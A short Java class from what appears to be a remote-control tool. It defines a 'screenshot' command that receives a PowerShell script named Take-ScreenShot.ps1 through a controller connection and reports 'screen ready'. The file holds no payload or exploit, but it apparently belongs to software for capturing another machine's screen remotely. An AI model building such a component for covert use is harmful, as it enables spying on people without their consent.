package commands;

import java.io.IOException;

import connection.Controller;

public class ScreenShotCommand extends Command{

	public ScreenShotCommand() {
		super("screenshot");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.receiveFile("Take-ScreenShot.ps1");
		ctrl.sendMsg("screen ready");
	}

}
